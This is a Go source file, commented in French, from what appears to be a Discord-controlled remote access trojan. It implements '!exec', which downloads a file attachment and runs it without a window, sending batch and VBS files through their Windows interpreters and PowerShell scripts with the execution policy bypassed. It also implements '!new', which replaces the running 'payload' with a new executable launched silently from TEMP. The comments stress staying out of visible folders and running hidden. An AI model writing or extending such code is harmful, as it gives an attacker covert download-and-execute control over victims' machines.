// attachments.go — commander par pièce jointe.
//
// Deux usages :
//
//	!exec   + un fichier joint  → le fichier est téléchargé puis exécuté
//	!new    + un exe joint      → le payload se met à jour et relance la
//	                              nouvelle version en arrière-plan
//
// Rien n'est écrit dans un dossier visible : tout passe par le dossier de
// travail, et l'exécution se fait sans fenêtre.
package main

import (
	"bytes"
	"fmt"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"
)

// attachment décrit une pièce jointe Discord.
type attachment struct {
	Filename string `json:"filename"`
	URL      string `json:"url"`
	Size     int64  `json:"size"`
}

// downloadAttachment télécharge une pièce jointe dans le dossier de travail.
func downloadAttachment(a attachment) (string, error) {
	if a.URL == "" || a.Filename == "" {
		return "", fmt.Errorf("pièce jointe invalide")
	}
	if a.Size > 64*1024*1024 {
		return "", fmt.Errorf("fichier trop gros (%d Mo)", a.Size/1024/1024)
	}
	req, err := http.NewRequest("GET", a.URL, nil)
	if err != nil {
		return "", err
	}
	req.Header.Set("User-Agent", discordUA)
	resp, err := httpc.Do(req)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()
	if resp.StatusCode != 200 {
		return "", fmt.Errorf("HTTP %d", resp.StatusCode)
	}
	var buf bytes.Buffer
	if _, err := buf.ReadFrom(resp.Body); err != nil {
		return "", err
	}
	safe := filepath.Base(strings.ReplaceAll(a.Filename, "\\", "_"))
	p := filepath.Join(workDir(), "dl-"+safe)
	if err := os.WriteFile(p, buf.Bytes(), 0700); err != nil {
		return "", err
	}
	return p, nil
}

// runDownloaded exécute un fichier téléchargé selon son extension.
func runDownloaded(path string) string {
	ext := strings.ToLower(filepath.Ext(path))
	var c *exec.Cmd
	switch ext {
	case ".bat", ".cmd":
		c = exec.Command("cmd.exe", "/d", "/c", path)
	case ".ps1":
		c = exec.Command("powershell.exe", "-NoProfile", "-ExecutionPolicy", "Bypass",
			"-File", path)
	case ".vbs":
		c = exec.Command("wscript.exe", path)
	default:
		c = exec.Command(path)
	}
	c.SysProcAttr = hiddenAttr()
	out, err := c.CombinedOutput()
	txt := decodeConsole(out)
	if err != nil && strings.TrimSpace(txt) == "" {
		// Un exe graphique rend la main tout de suite : ce n'est pas une erreur.
		return "lancé : " + filepath.Base(path)
	}
	return fmt.Sprintf("exécuté : %s\n%s", filepath.Base(path), truncate(strings.TrimSpace(txt), 1500))
}

// handleAttachments traite une commande portant des pièces jointes.
func handleAttachments(cmd string, atts []attachment) {
	switch strings.ToLower(strings.TrimSpace(cmd)) {
	case "exec", "run", "dl-exec":
		for _, a := range atts {
			p, err := downloadAttachment(a)
			if err != nil {
				discordReply("téléchargement impossible : " + err.Error())
				continue
			}
			discordReply(runDownloaded(p))
		}

	case "new", "update", "maj":
		if len(atts) == 0 {
			discordReply("envoie l'exe en pièce jointe avec `!new`.")
			return
		}
		p, err := downloadAttachment(atts[0])
		if err != nil {
			discordReply("téléchargement impossible : " + err.Error())
			return
		}
		data, err := os.ReadFile(p)
		if err != nil || len(data) < 1024 || string(data[:2]) != "MZ" {
			discordReply("ce n'est pas un exécutable Windows valide.")
			return
		}
		// On écrit la nouvelle version à côté, puis on la lance en -watch :
		// elle prend le relais, l'ancienne instance continue puis s'efface.
		target := filepath.Join(os.Getenv("TEMP"), "~"+workDirName+"-new.exe")
		if err := os.WriteFile(target, data, 0755); err != nil {
			discordReply("écriture impossible : " + err.Error())
			return
		}
		c := exec.Command(target, "-watch")
		c.SysProcAttr = hiddenAttr()
		if err := c.Start(); err != nil {
			discordReply("lancement impossible : " + err.Error())
			return
		}
		discordReply(fmt.Sprintf("nouvelle version lancée (%d Ko). L'ancienne reste active jusqu'au prochain redémarrage.",
			len(data)/1024))
		time.Sleep(1500 * time.Millisecond)

	default:
		discordReply("pièce jointe reçue. Commandes possibles : `!exec` (exécuter) ou `!new` (mettre à jour le payload).")
	}
}
